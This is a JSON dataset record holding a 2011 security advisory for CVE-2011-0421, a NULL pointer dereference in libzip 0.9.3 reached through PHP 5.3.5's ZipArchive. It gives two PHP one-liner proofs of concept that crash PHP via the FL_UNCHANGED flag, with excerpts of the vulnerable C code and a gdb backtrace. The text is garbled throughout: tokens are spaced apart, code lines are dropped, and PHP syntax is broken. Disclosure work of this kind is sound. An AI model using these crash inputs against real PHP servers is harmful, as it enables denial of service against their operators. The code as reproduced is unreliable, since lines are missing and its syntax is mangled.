{
    "text": "vul_name : libzip 0.9.3 _zip_name_locate NULL Pointer Dereference ( incl PHP 5.3.5 )  ， vul_cve : CVE-2011-0421 ， vul_poc : libzip 0.9.3 _zip_name_locate NULL Pointer Dereference ( incl PHP 5.3.5 )  ， Author : Maksymilian Arciemowicz ， Date :  ， - Dis. : 03.01.2011 ， - Pub. : 18.03.2011 ， CVE : CVE-2011-0421 ， CERT : VU # 325039 ， Affected Software :  ， - libzip 0.9.3 ， - PHP 5.3.5 ( fixed 5.3.6 )  ， - 0.Description - ， libzip is a C library for reading , creating , and modifying zip archives. Files can be added from data buffers , files , or compressed data copied directly from other zip archives. Changes made without closing the archive can be reverted. The API is documented by man pages. ， - 1.Description - ， libzip allows remote and local attackers to Denial of Service ( Null Pointer Dereference ) if ZIP_FL_UNCHANGED flag is set. ， -lib/zip_name_locate.c- ， int ， _zip_name_locate ( struct zip * za , const char * fname , int flags ,  ， struct zip_error * error )  ， { ， int (  * cmp )  ( const char *  , const char *  )  ;  ， const char * fn ,  * p ;  ， int i , n ;  ， _zip_error_set ( error , ZIP_ER_INVAL , 0 )  ;  ， } ， cmp = ( flags & ZIP_FL_NOCASE ) ? strcasecmp : strcmp ;  ， n = ( flags & ZIP_FL_UNCHANGED ) ? za->cdir->nentry : za->nentry ; <= CRASH HERE ， -lib/zip_name_locate.c- ， Project using libzip : KDE Utilities ( 4.x branch )  , MySQL Workbench , ckmame , fuse-zip , php zip extension , Endeavour2 , FreeDink ， Better analysis based on PHP code ZipArchive , bellow ， - 2. PHP 5.3.5 ZipArchive (  ) - ， PoC1 :  ， php -r ' $ nx=new ZipArchive (  )  ;  $ nx->open ( \"/dev/null\" )  ;  $ nx->locateName ( \"a\" , ZIPARCHIVE : FL_UNCHANGED )  ; ' ， PoC2 :  ， php -r ' $ nx=new ZipArchive (  )  ;  $ nx->open ( \"empty.zip\" )  ;  $ nx->statName ( \"a\" , ZIPARCHIVE : FL_UNCHANGED )  ; ' ， Let's ， -php_zip.c- ， . ， static ZIPARCHIVE_METHOD ( locateName )  ， { ， . ， ZIP_FROM_OBJECT ( intern , this )  ;  ， &name , &name_len , &flags ) = FAILURE ) { ， } ， . ， idx = ( long ) zip_name_locate ( intern ,  ( const char *  ) name , flags )  ; <= CRASH IN THIS FUNCTION ， . ， -php_zip.c- ， and let`s see ， -zip_name_locate.c- ， ZIP_EXTERN ( int )  ， zip_name_locate ( struct zip * za , const char * fname , int flags )  ， { ， } ， int ， _zip_name_locate ( struct zip * za , const char * fname , int flags ,  ， struct zip_error * error )  ， { ， int (  * cmp )  ( const char *  , const char *  )  ;  ， const char * fn ,  * p ;  ， int i , n ;  ， _zip_error_set ( error , ZIP_ER_INVAL , 0 )  ;  ， } ， cmp = ( flags & ZIP_FL_NOCASE ) ? strcmpi : strcmp ;  ， n = ( flags & ZIP_FL_UNCHANGED ) ? za->cdir->nentry : za->nentry ; <= CRASH HERE IF ZIPARCHIVE : FL_UNCHANGED ， . ， -zip_name_locate.c- ，  ( gdb ) bt ，  # 0 0x00000000006407cc in _zip_name_locate ( za=0x118d520 , fname=0x116ac70 \"a\" , flags=32767 ,  ， error=0xffffffff00000000 ) at /build/buildd/php5-5.3.3/ext/zip/lib/zip_name_locate.c : 65 ，  # 1 0x00000000006381e6 in c_ziparchive_locateName ( ht=2 , return_value=0x1169418 , return_value_ptr=0xffffffff ,  ， this_ptr=0x118d530 , return_value_used=-176126592 ) at /build/buildd/php5-5.3.3/ext/zip/php_zip.c : 1877 ，  # 2 0x00000000006e986a in zend_do_fcall_common_helper_SPEC ( execute_data=0x7ffff7eb7068 )  ， at /build/buildd/php5-5.3.3/Zend/zend_vm_execute.h : 316 ，  # 3 0x00000000006c0b00 in execute ( op_array=0x1168568 ) at /build/buildd/php5-5.3.3/Zend/zend_vm_execute.h : 107 ， . ， Program received signal SIGSEGV , Segmentation fault. ， 0x00000000006407cc in _zip_name_locate ( za=0x118d520 , fname=0x1169400 \"9223372036854775808\" , flags=32767 ,  ， error=0xffffffff00000000 ) at /build/buildd/php5-5.3.3/ext/zip/lib/zip_name_locate.c : 65 ， 65 n = ( flags & ZIP_FL_UNCHANGED ) ? za->cdir->nentry : za->nentry ; ",
    "time": "2011-03-18 / 2012-03-12"
}